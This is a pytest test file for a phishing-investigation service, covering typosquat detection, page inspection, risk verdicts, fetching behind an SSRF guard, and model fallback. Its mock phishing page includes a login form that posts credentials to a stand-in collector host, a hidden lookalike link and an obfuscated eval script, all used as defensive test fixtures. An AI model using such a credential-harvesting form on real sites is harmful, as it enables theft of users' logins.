import time

import pytest

from app.detectors.lookalike import check_hostname
from app.integrations import gemini
from app.security import ssrf
from app.services.baseline_assessment import baseline_assessment
from app.services import investigation_service as svc
from app.tools.indicators import extract_indicators
from app.tools.page_inspection import analyze_html


@pytest.mark.parametrize(
    "host",
    ["rnicrosoft.com", "micros0ft.com", "paypaI.com", "erniratesnbd.com", "microsоft.com", "amaz0n.ae"],
)
def test_lookalike_domains_are_flagged(host):
    findings = check_hostname(host)
    assert any(f["type"] == "suspicious" for f in findings), host
    assert any("typosquat" in f["message"] or "deceptive characters" in f["message"] for f in findings)


@pytest.mark.parametrize(
    "host",
    ["microsoft.com", "www.google.com", "dubaipolice.gov.ae", "example.com", "web1.com", "applepie.com", "192.0.2.1"],
)
def test_genuine_or_unrelated_domains_are_not_flagged(host):
    assert check_hostname(host) == []


def test_brand_used_as_subdomain_is_flagged():
    assert any("Subdomain uses the brand name" in f["message"] for f in check_hostname("paypal.secure-pay.example.org"))


PHISH = """<html><head><title>Microsoft sign in</title></head><body><h1>Microsoft Account</h1>
<form action="https://collector.evil-site.xyz/post" method="post"><input name="u"><input type="password" name="p"></form>
<a href="https://rnicrosoft.com/x" style="display:none">promo</a>
<script>eval(atob("YQ=="))</script></body></html>"""


def test_phishing_page_findings():
    result = analyze_html(PHISH, "https://login-verify.example.net/signin")
    messages = " | ".join(f["message"] for f in result["findings"])
    assert "different domain" in messages
    assert "hidden link" in messages
    assert "obfuscated script" in messages
    assert "possible impersonation" in messages
    assert result["red_flag_count"] >= 4


def test_clean_page_gets_positive_finding_only():
    html = "<html><title>Blog</title><body><a href='/about'>About</a><a href='https://github.com/x'>code</a></body></html>"
    result = analyze_html(html, "https://myblog.example.org/")
    assert result["red_flag_count"] == 0
    assert [f["type"] for f in result["findings"]] == ["positive"]


def test_bare_domain_is_analysed_only_in_link_mode():
    assert extract_indicators("microsoft.com", link_mode=True)["urls"] == ["https://microsoft.com"]
    assert extract_indicators("see file.txt e.g. this")["urls"] == []
    assert extract_indicators("go to www.evil.com/x")["urls"] == ["https://www.evil.com/x"]


def _link_result(findings, page_status="inspected"):
    return {"url": "https://x.test", "findings": findings, "page_analysis": {"status": page_status}}


def test_baseline_reachable_clean_page_is_low_risk_not_inconclusive():
    result = baseline_assessment(
        {"urls": ["https://x.test"], "domains": ["x.test"], "emails": []},
        [_link_result([{"type": "positive", "message": "URL uses HTTPS"}])],
        [], None, None, [],
    )
    assert result["verdict"] == "Low Risk"
    assert result["confidence"] <= 70
    assert "What we could not check" in result["reasoning"]


def test_baseline_lookalike_is_high_or_suspicious():
    findings = check_hostname("rnicrosoft.com")
    result = baseline_assessment(
        {"urls": ["https://rnicrosoft.com"], "domains": ["rnicrosoft.com"], "emails": []},
        [_link_result(findings)], [], None, None, [],
    )
    assert result["verdict"] in {"Suspicious", "High Risk"}
    assert "imitates microsoft.com" in result["reasoning"]


def test_baseline_abstains_without_any_evidence():
    result = baseline_assessment({"urls": [], "domains": [], "emails": []}, [], [], None, None, [])
    assert result["verdict"] == "Inconclusive" and result["confidence"] == 0


def test_ai_disabled_falls_back_to_baseline(monkeypatch):
    monkeypatch.setattr(svc, "investigate_url", lambda url: {
        "url": url, "normalized_url": url, "hostname": "rnicrosoft.com",
        "findings": check_hostname("rnicrosoft.com"),
        "redirect_analysis": {"status": "completed", "hops": [], "redirect_count": 0},
    })
    monkeypatch.setattr(svc, "gather_threat_intelligence", lambda *a, **k: [])
    monkeypatch.setattr(svc, "save_investigation", lambda *a, **k: 7)
    monkeypatch.setattr("app.tools.ai_analysis.available", lambda: False)
    out = svc.run_investigation("rnicrosoft.com", category="link", owner_id="u")
    assert out["verdict"] in {"Suspicious", "High Risk"}
    assert out["stages"]["calculate_assessment"] is False


def test_fetch_page_follows_redirects_and_bounds(monkeypatch):
    monkeypatch.setattr(ssrf, "validate_public_target", lambda url: (url, ["203.0.113.5"]))
    calls = []

    def fake(url, addresses, max_bytes):
        calls.append(url)
        if url.endswith("/a"):
            return {"status_code": 302, "location": "/b", "content_type": "", "body": b"", "truncated": False}
        return {"status_code": 200, "location": None, "content_type": "text/html", "body": b"<html></html>", "truncated": False}

    monkeypatch.setattr(ssrf, "_fetch_body_once", fake)
    page = ssrf.fetch_page("https://example.test/a")
    assert page["status"] == "fetched" and page["final_url"].endswith("/b") and len(calls) == 2


def test_fetch_page_non_html_is_not_inspected(monkeypatch):
    monkeypatch.setattr(ssrf, "validate_public_target", lambda url: (url, ["203.0.113.5"]))
    monkeypatch.setattr(ssrf, "_fetch_body_once", lambda *a: {
        "status_code": 200, "location": None, "content_type": "application/pdf", "body": b"", "truncated": False})
    assert ssrf.fetch_page("https://example.test/f.pdf")["status"] == "no_html"


class _Boom(Exception):
    pass


def test_gemini_skips_exhausted_model_and_uses_next(monkeypatch):
    used = []

    class Models:
        def generate_content(self, model, contents, config):
            used.append(model)
            if model == "m1":
                raise _Boom("429 RESOURCE_EXHAUSTED quota")
            return type("R", (), {"text": '{"ok": true}'})()

    monkeypatch.setattr(gemini, "CLIENT", type("C", (), {"models": Models()})())
    monkeypatch.setattr(gemini, "MODELS", ("m1", "m2"))
    gemini._COOLDOWN.clear()
    assert gemini.generate_json("p", label="t") == {"ok": True}
    assert used == ["m1", "m2"]
    used.clear()
    assert gemini.generate_json("p", label="t") == {"ok": True}
    assert used == ["m2"], "exhausted model must be skipped during cooldown"
    gemini._COOLDOWN.clear()
